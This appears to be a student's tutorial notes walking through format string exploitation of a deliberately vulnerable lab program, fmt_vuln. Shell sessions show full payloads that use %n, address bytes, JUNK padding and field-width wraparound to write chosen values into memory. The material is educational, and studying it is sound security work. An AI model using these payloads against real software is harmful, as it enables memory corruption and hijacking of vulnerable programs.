If the %s format parameter can be used to read an arbitrary memory address, we can use the same technique with %n to write to an arbitrary memory addtress

The test_val variable has been printing its address and value in the debug statement of the vulnerable fmt_vuln.c program, just begging to be overwritten
The test variable is located at 0x08049794, so by using a similar technique, we write to the variable
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
The right way to print user-controlled input:
????%08x.%08x.%08x.%s
The wrong way to print user-controlled input:
????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
[*] test_val @ 0x08049794 = -72 0xffffffb8

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%08x.%08x.%08x.%n
The right way to print user-controlled input:
??%08x.%08x.%08x.%n
The wrong way to print user-controlled input:
??bffff3d0.b7fe75fc.00000000.
[*] test_val @ 0x08049794 = 31 0x0000001f
__________________________________________________________________________________

Here, we can't see the memory in the test_val in integer, as only string format parameter accepts pointer address
As this shows, the test_val variable can indeed be overwritten using the %n format parameter
The resulting value in the test variable depends on the number of bytes written before the %n(for the corresponding printf function)
       The value is 31 beacuse the printed values are :
       (\x94\x97\x04\x08)-4 bytes, (bffff3d0.b7fe75fc.00000000.) - 27 bytes, totaling 31 bytes
This can be controlled to a greater degree by manipulating the field width option
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%n
The right way to print user-controlled input:
??%x%x%x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc0
[*] test_val @ 0x08049794 = 21 0x00000015

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%100x%n
The right way to print user-controlled input:
??%x%x%100x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
(100 blank spaces)
0
[*] test_val @ 0x08049794 = 120 0x00000078

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%180x%n
The right way to print user-controlled input:
??%x%x%180x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
(180 blank spaces)
0
[*] test_val @ 0x08049794 = 200 0x000000c8

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%400x%n
The right way to print user-controlled input:
??%x%x%400x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
(400 blank spaces)
0
[*] test_val @ 0x08049794 = 420 0x000001a4
__________________________________________________________________________________

By manipulating the field-width option of one of the format parameters before the %n, a certain number of blamk spaces can be inserted, resulting in the output having some blank lines(%100x means make total of 100 characters by adding blank lines to left or right)
These lines, in turn, can be used to control the number of bytes written before the %n format parameter
This approach will work for small numbers, but it won't work for larger ones, like memory addresses

Looking at the hexadecimal representation of the test_val value, it's apparent that the least significant byte can be controlled fairly well(least significant byte is actually located in the first byte of the 4-byte word of memory)
This detail can be used to write an entire address
If 4 writes are done at sequential memory addresses, the least significant byte can be written to each byte of a 4-byte word, as shown:
__________________________________________________________________________________
Memory                        94 95 96 97 
First write to 0x08049794     AA 00 00 00 
Second write to 0x08049795       BB 00 00 00 
Third write to 0x08049796           CC 00 00 00 
Fourth write to 0x08049797             DD 00 00 00 
Result                        AA BB CC DD 
__________________________________________________________________________________

As an example, let's try to write the address 0xDDCCBBAA into the test variable
In memory, the first byte of the test variable should be 0xAA, then 0xBB, then 0xCC and finally 0xDD
4 separate writes to the memory addresses 0x08049794, 0x08049795,0x08049796 and 0x08049797 should accomplish this
The first write will write the value 0x000000aa, the second 0x000000bb, the third 0x000000cc and finally 0x000000dd

The first write should be easy
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??%x%x%8x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
 0
[*] test_val @ 0x08049794 = 28 0x0000001c

reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xaa - 28 + 8
$1 = 150
(gdb) quit

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%150x%n
The right way to print user-controlled input:
??%x%x%150x%n
The wrong way to print user-controlled input:
??bffff3d0b7fe75fc
0
[*] test_val @ 0x08049794 = 170 0x000000aa
__________________________________________________________________________________

The last %x format parameter uses 8 as the field width to standardize the output
This is essentially reading a random DWORD from the stack, which could output anywhere from 1 to 8 characters(and will fill the width with blank space)
Since the first overwrite puts 28 into test_val, using 150 as the field width instead of 8 should control the least significant byte of test_val to 0xAA

Now for the next write
Another argument is needed for another %x format parameter to increment the byte count to 187, which is 0xBB in decimal
         What will happen if you don't insert the 4 byte argument is that the %x after the first write will read the second address as an integer and directly write to the third address
This argument could be anything; it just has to be 4 bytes long and must be located after the first arbitrary memory address of 0x08049754
Since this is all still in the memory of format string, it can be easily controlled
The word JUNK is 4 bytes long and will work fine

After that, the next memory address to be written to, 0x08049755, should be put into memory so the second %n format parameter can access it
This means the beginning of the format string should consist of the target memory address, 4 bytes of junk, and then the target memory address + 1
But all of these bytes of memory are also printed by the format function, thus incrementing the byte counter used for the %n format parameter
This is getting tricky

Perhaps we should think about the beginning of the format string ahead of time
The goal is to have 4 writes
Each one will need to have a memory address passed to it, and among them all, 4 bytes of junk are needed to properly increment the byte counter for the %n format parameters
The first %x format parameter can use the 4 bytes found before the format string itself, but the remaining 3 will need to be supplied data
For the entire write procedure, the beginning of the format string should look like:

 0x08049794             0x08049795             0x08049796             0x08049797
__________________________________________________________________________________
|94,97,04,08|J, U, N, K|95,97,04,08|J, U, N, K|96,97,04,08|J, U, N, K|97,97,04,08|
|___________|__________|___________|__________|___________|__________|___________|

Let's give it a try:

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%8x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
 0
[*] test_val @ 0x08049794 = 52 0x00000034

reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xaa - 52 + 8"
$1 = 126
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%126x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
0
[*] test_val @ 0x08049794 = 170 0x000000aa
__________________________________________________________________________________

The addresses and junk data at the beginning of the format string changed the value of the necessary field width option for the %x format parameter
However, this is easily recalculated using the same method as before
Another way this could have been done is to subtract 24 from the previous field width value of 150, since 6 new 4-byte words have been added to the front of the format string

Now that all the memory is set up ahead of time in the beginning of the format string, the second write should be simple
__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xbb - 0xaa"
$1 = 17
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
0       4b4e554a
[*] test_val @ 0x08049794 = 48042 0x0000bbaa
__________________________________________________________________________________

The next desired value for the least significant byte is 0xBB
A hexadecimal calculator shows that 17 more bytes need to be written before the next %n format parameter
Since memory has already been set up for a %x format parameter, it's simple to write 17 bytes using the field width option
This process can be repeated for the third and fourth writes
__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcc - 0xbb"
$1 = 17
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xdd - 0xcc"
$1 = 17
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n%17x%n%17x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n%17x%n%17x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
0          4b4e554a          4b4e554a          4b4e554a
[*] test_val @ 0x08049794 = -573785174 0xddccbbaa
__________________________________________________________________________________

By controlling the least significant byte and performing 4 writes, an entire address can be written to any memory address
It should be noted that the 3 bytes found after the target address will also be overwritten using this technique
This can be quickly explored by statically declaring another initialized variable called next_val, right after test_val, and also displaying this value in the debug output
The changes can be made in an editor or with some more sed magic

Here, next_val is initialized with the value 0x11111111, so the effect of the write operations on it will be apparent
__________________________________________________________________________________
reader@hacking:~/booksrc $ sed -e 's/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/g;x;G}' fmt_vuln.c > fmt_vuln2.c
reader@hacking:~/booksrc $ diff fmt_vuln.c fmt_vuln2.c
7c7
<    static int test_val = -72;
---
>    static int test_val = -72, next_val = 0x11111111;
27a28
>    printf("[*] next_val @ 0x%08x = %d 0x%08x\n", &next_val, next_val, next_val);
reader@hacking:~/booksrc $ gcc -o fmt_vuln2 fmt_vuln2.c
reader@hacking:~/booksrc $ ./fmt_vuln2 test
The right way:
test
The wrong way:
test
[*] test_val @ 0x080497b4 = -72 0xffffffb8
[*] next_val @ 0x080497b8 = 286331153 0x11111111
__________________________________________________________________________________

As shown in the output, the code change has also moved the address of the test_val variable
However, next_val is shown to be adjacent to it
For practice, let's write an address into the variable test_val again, using the new address

Last time, a very convenient address of 0xddccbbaa was used
Since each byte is greater than the previous byte(dd > cc, cc > bb...), it's easy to increment the byte counter for each byte
But what if an address like 0x0806abcd is used?
With this address, the first byte of 0xCD is easy to write using the %n format parameter by outputting 205 bytes total with a field width of 161
But then the next byte to be written is 0xAB, which would need to have 171 bytes outputted
It's easy to increment the byte counter for the %n format parameter, but it's impossible to subtract from it
__________________________________________________________________________________
reader@hacking:~/booksrc $ ./fmt_vuln2 AAAA%x%x%x%x
The right way to print user-controlled input:
AAAA%x%x%x%x
The wrong way to print user-controlled input:
AAAAbffff3d0b7fe75fc041414141
[*] test_val @ 0x080497f4 = -72 0xffffffb8
[*] next_val @ 0x080497f8 = 286331153 0x11111111
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcd - 5"
$1 = 200

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%8x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
 0
[*] test_val @ 0x08049794 = -72 0xffffffb8

reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%8x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%8x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
 0
[*] test_val @ 0x080497f4 = 52 0x00000034
[*] next_val @ 0x080497f8 = 286331153 0x11111111

reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcd - 52 + 8"
$1 = 161
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
0
[*] test_val @ 0x080497f4 = 205 0x000000cd
[*] next_val @ 0x080497f8 = 286331153 0x11111111

reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xab - 0xcd"
$1 = -34
__________________________________________________________________________________

Instead of trying to subtract 34 from 205, the least significant byte is just wrapped around to 0x1AB by adding 222 to 205 to produce 427, which is the decimal representation of 0x1AB
          What this means is that instead of writing 0xAB to the memory address, we will write 0x1AB to the memory
          Beacuse of little-endian nature, the value will be stored as 0xAB and 0x01
          We will then overwrite the 0x01 with the value corresponding to the byte of the target memory address using the same method
This technique can be used to wrap around again and set the least significant byte to 0x06 for the third write:
__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x1ab - 0xcd"
$1 = 222
reader@hacking:~/booksrc $ gdb -q --batch -ex "p /d 0x1ab"
$1 = 427
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
                                     0
                                                 4b4e554a
[*] test_val @ 0x080497f4 = 109517 0x0001abcd
[*] next_val @ 0x080497f8 = 286331136 0x11111100

reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x06 - 0xab"
$1 = -165
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x106 - 0xab"
$1 = 91

reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
                                      0
                                                  4b4e554a
                             4b4e554a
[*] test_val @ 0x080497f4 = 33991629 0x0206abcd
[*] next_val @ 0x080497f8 = 286326784 0x11110000
__________________________________________________________________________________

With each write, bytes of the next_val variable, adjacent to test_val, are being overwritten
The wraparound technique seems to be working fine, but a slight problem manifests itself as the final byte is attempted
__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x08 - 0x06"
$1 = 2
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n%2x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%2x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3a0b7fe75fc
0
4b4e554a
4b4e554a4b4e554a
[*] test_val @ 0x080497f4 = 235318221 0x0e06abcd
[*] next_val @ 0x080497f8 = 285212674 0x11000002
__________________________________________________________________________________

What happened here? The difference between 0x06 and 0x08 is only 2, but eight bytes are output, resulting in 0x0e being written by the %n format parameter, instead
           This happens because we use JUNK, a 4 byte value for %x which increases the written bytes to 8(8 hexadecimal characters=4 byte)
           As we need 2 bytes for the last byte to go from 06 to 08, this won't work
           So, we increase the bytes to 258 so that the last byte becomes 
           ________________
           |01|08|06|ab|cd|,
           which stored in little-endian becomes 
           ________________
           |cd|ab|06|08|01|
This is beacuse the field width option for the %x format parameter is only a minimum field width, and 8 bytes of data were output
This problem can be alleviated by simply wrapping around again; however, it's good to know the limitations of the field width option
__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x108 - 0x06"
$1 = 258
reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n%258x%n
The right way to print user-controlled input:
??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%258x%n
The wrong way to print user-controlled input:
??JUNK??JUNK??JUNK??bffff3a0b7fe75fc
                                 0
                                                      4b4e554a
                          4b4e554a
                                                                   4b4e554a
[*] test_val @ 0x080497f4 = 134654925 0x0806abcd
[*] next_val @ 0x080497f8 = 285212675 0x11000003
__________________________________________________________________________________

Just like before, the appropriate addresses and junk data are put in the beginning of the format string, and the least significant byte is controlled for 4 write operations to overwrite all 4 bytes of the variable test_val
Any value subtractions to the least significant byte can be accomplished by wrapping the byte around
Also, any additions less than 8 bytes may need to be wrapped in a similar fashion